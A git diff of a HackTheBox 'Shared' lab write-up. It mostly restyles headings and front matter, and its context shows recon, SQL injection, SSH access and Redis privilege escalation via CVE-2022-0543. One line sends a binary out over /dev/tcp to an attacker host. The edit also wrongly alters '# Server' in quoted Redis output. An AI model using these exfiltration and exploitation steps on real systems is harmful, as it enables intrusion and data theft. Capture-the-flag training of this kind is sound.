@@ -2,14 +2,12 @@
 layout: post
 title: HackTheBox - Shared
 date: 2022-11-12 22:50 +0300
-category: HackTheBox
+categories: [HackTheBox, Medium]
+image:
+  path: /assets/hackthebox/shared/Shared.png
 ---
 
-![Machine logo](/assets/hackthebox/shared/Shared.png){:height="400px" width="600px"}
-
-# Table of contents
-
-# Configuration
+## Configuration
 
 If you're using your own machine like me, you have to access HTB network via `OpenVPN`:
 
@@ -27,9 +25,9 @@ It is very useful to append `/etc/hosts/` with ip address of the machine. It is 
 └─$ echo "10.10.11.172  shared" | sudo tee -a /etc/hosts
 ```
 
-# Reconnaissance
+## Reconnaissance
 
-## Port scan
+### Port scan
 
 As always, we have to start with scanning ports on the host. I like to use a chain of `masscan` and `nmap` in this case. Masscan is probably the most powerful asyncronious port scanner now. At first masscan gets ports and puts them into file. Then, I perform string operations to get port numbers and run them with nmap to scan deeper.
 
@@ -86,7 +84,7 @@ Here we have 3 opened ports with `SSH`, `HTTP` and `HTTPS` services on them. HTT
 
 > 10.10.11.172    shared shared.htb
 
-## Web application
+### Web application
 
 ![Index page](/assets/hackthebox/shared/web.png)
 
@@ -108,9 +106,9 @@ This page provides a link to subdomain `checkout.shared.htb`. We have to add thi
 
 We can see a list with products we have added. Let's explore how it does work.
 
-# user.txt
+## user.txt
 
-## Checkout page
+### Checkout page
 
 If we open our browser developer tools, in Storage page we can see that the web-application provides us with `cookies`. 
 
@@ -324,9 +322,9 @@ Then, I just copied SSH private key to my local machine and logged in with SSH. 
 
 ![Got user flag](/assets/hackthebox/shared/got_user.png)
 
-# root.txt
+## root.txt
 
-## Exploring
+### Exploring
 
 To find a path to escalate our privileges we have to list processes. I've checked for only root owned processes here.
 
@@ -356,7 +354,7 @@ dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
 [+] Logging to redis instance using password...
 
 INFO command result:
-# Server
+## Server
 redis_version:6.0.15
 redis_git_sha1:00000000
 redis_git_dirty:0
@@ -391,7 +389,7 @@ dan_smith@shared:~$ cat /usr/local/bin/redis_connector_dev > /dev/tcp/IP/PORT
 
 On our machine we are getting a file.
 
-## Get Redis password
+### Get Redis password
 
 I tried to disassemble it first, but I haven't found any useful. So my way to get the password was created with Redis authentication mechanism. You can read about it [here](https://redis.io/commands/auth/). To authenticate you have to provide line like `AUTH [username] password`. There is no username here, so we just have to get a password.
 
@@ -406,7 +404,7 @@ The last line of the output is our password. Let's check it on the shared host.
 And there it is. From the binary's output we noted that the version of the server is `6.0.15`. This version is vulnerable to `CVE-2022-0543` and have a known [exploit](https://github.com/aodsec/CVE-2022-0543).
 
 
-## Exploit Redis Server
+### Exploit Redis Server
 
 Here we have to copy the exploit and modify it with our ip, port and a password. The final exploit will look like below.
 
@@ -460,7 +458,7 @@ We got it! Take the flag and get the box Pwn3d!
 
 ![Pwn3d!](/assets/hackthebox/shared/pwned.png){:height="400px" width="600px"}
 
-# Conclusion
+## Conclusion
 
 This was an interesting box. It was cool to learn about UNION based sql injections and redis abusing. Thanks for the authors!
 
